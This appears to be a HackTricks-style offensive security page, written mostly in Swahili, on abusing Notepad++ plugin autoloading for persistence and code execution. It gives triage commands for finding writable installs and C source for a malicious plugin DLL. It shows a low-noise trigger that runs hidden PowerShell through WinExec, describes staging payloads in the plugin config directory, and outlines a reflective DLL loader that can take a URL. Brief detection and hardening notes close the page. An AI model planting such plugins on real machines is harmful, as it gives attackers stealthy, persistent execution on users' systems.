# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ itafanya **autoload kila plugin DLL inayopatikana chini ya subfolders zake za `plugins`** wakati wa kuanza. Kudondosha malicious plugin ndani ya **Notepad++ installation yoyote inayoweza kuandikwa** kunatoa code execution ndani ya `notepad++.exe` kila mara editor inapoanza, jambo ambalo linaweza kutumiwa kwa **persistence**, stealthy **initial execution**, au kama **in-process loader** ikiwa editor imeanzishwa elevated.

Tangu **Notepad++ 7.6+** mpangilio unaotarajiwa wa manual-install ni **subfolder moja kwa kila plugin** (`plugins\<PluginName>\<PluginName>.dll`). Katika **portable mode** (uwepo wa `doLocalConf.xml` kando ya `notepad++.exe`), tree nzima ya application hubaki local kwa directory hiyo, jambo ambalo mara nyingi hugeuza copied/admin tool bundles kuwa user-writable execution surface rahisi.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (kwa kawaida inahitaji admin kuandika).
- Writable options for low-privileged operators:
- Tumia **portable Notepad++ build** katika folder inayoweza kuandikwa na user.
- Nakili `C:\Program Files\Notepad++` kwenda kwenye path inayodhibitiwa na user (mfano `%LOCALAPPDATA%\npp\`) na endesha `notepad++.exe` kutoka hapo.
- Tafuta **admin tool bundles**, nakala za zip zilizofunguliwa, au help-desk toolkits ambazo tayari zina `doLocalConf.xml` na zipo nje ya `Program Files`.
- Kila plugin hupata subfolder yake chini ya `plugins` na hupakiwa automatically wakati wa startup; menu entries huonekana chini ya **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Mahali pa kupakia Plugin (execution primitives)
Notepad++ inatarajia **exported functions** maalum. Zote hizi huitwa wakati wa initialization, zikitoa execution surfaces nyingi:
- **`DllMain`** — huendeshwa mara moja DLL inapopakiwa (first execution point).
- **`setInfo(NppData)`** — huitwa mara moja wakati wa load ili kutoa handles za Notepad++; kawaida ni mahali pa kusajili menu items.
- **`getName()`** — hurudisha jina la plugin linaloonyeshwa kwenye menu.
- **`getFuncsArray(int *nbF)`** — hurudisha menu commands; hata ikiwa ni empty, huitwa wakati wa startup.
- **`beNotified(SCNotification*)`** — hupokea matukio ya Notepad++ / Scintilla (inafaa kuchelewesha payloads hadi user action au editor event).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, inafaa kwa data exchanges kubwa.
- **`isUnicode()`** — compatibility flag inayokaguliwa wakati wa load.

Exports nyingi zinaweza kutekelezwa kama **stubs**; execution inaweza kutokea kutoka `DllMain` au callback yoyote hapo juu wakati wa autoload.

## Skeleton ndogo ya malicious plugin
Compile DLL yenye exports zinazotarajiwa na uiweke katika `plugins\\MyNewPlugin\\MyNewPlugin.dll` ndani ya folder ya Notepad++ inayoweza kuandikwa:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Build the DLL (Visual Studio/MinGW).
2. Create the plugin subfolder under `plugins` and drop the DLL inside.
3. Restart Notepad++; the DLL is loaded automatically, executing `DllMain` and subsequent callbacks.

## Low-noise trigger pattern via `beNotified`
Kwa OPSEC, payload nyingi hazipaswi **kuwasha** kutoka `DllMain`. Njia ya chini ya kelele ni kuruhusu plugin ipakie kwa usafi, kisha itekeleze tu baada ya tukio la halisi la editor kama **startup complete**, **buffer activation**, au **herufi ya kwanza iliyochapwa**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Hii inalingana zaidi na public offensive research kuliko noisy `DllMain` beacon: DLL bado inaloadwa kiotomatiki wakati wa startup, lakini hatua mbaya inacheleweshwa hadi Notepad++ ionekane kwa kweli inatumika.

## Kutumia plugin config directory kama secondary storage
Notepad++ inatoa `NPPM_GETPLUGINSCONFIGDIR`, ambayo hurudisha **plugin configuration directory ya user wa sasa**. Plugin mbaya inaweza kutumia hii ili kuweka DLL ya kwenye disk iwe minimal wakati inahifadhi encrypted config, staged payloads, au tasking files katika path ambayo inaonekana kama kawaida ya plugin state.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Kiutendaji hii ni muhimu wakati unapotaka:
- tiny autoloaded bootstrap DLL;
- per-user tasking bila kugusa tena main plugin binary;
- kutenganisha **autoload trigger** kutoka second stage nzito zaidi.

## Reflective loader plugin pattern
A weaponized plugin inaweza kugeuza Notepad++ kuwa **reflective DLL loader**:
- Weka minimal UI/menu entry (mfano, "LoadDLL").
- Kubali **file path** au **URL** ili kuchukua payload DLL.
- Reflectively map DLL ndani ya current process na invoke exported entry point (mfano, loader function ndani ya DLL iliyochukuliwa).
- Faida: tumia tena GUI process inayoonekana benign badala ya ku-spawn loader mpya; payload hurithi integrity ya `notepad++.exe` (ikiwemo elevated contexts).
- Trade-offs: kudondosha **unsigned plugin DLL** kwenye disk ni noisy; variation ya vitendo ni kutumia autoloaded plugin tu kama stub na kuweka real implant encrypted/staged mahali pengine.

## Detection and hardening notes
- Block au monitor **writes to Notepad++ plugin directories** (ikiwemo portable copies kwenye user profiles); wezesha controlled folder access au application allowlisting.
- Alert juu ya **new unsigned DLLs** chini ya `plugins`, mabadiliko kwenye portable Notepad++ trees, na unusual **child processes/network activity** kutoka `notepad++.exe`.
- Baseline legitimate plugins na chunguza kila DLL mpya inayosafirisha normal Notepad++ plugin interface lakini pia huzuia shells, PowerShell, au network beacons.
- Enforce plugin installation kupitia **Plugins Admin** pekee, na zuia execution ya portable copies kutoka untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
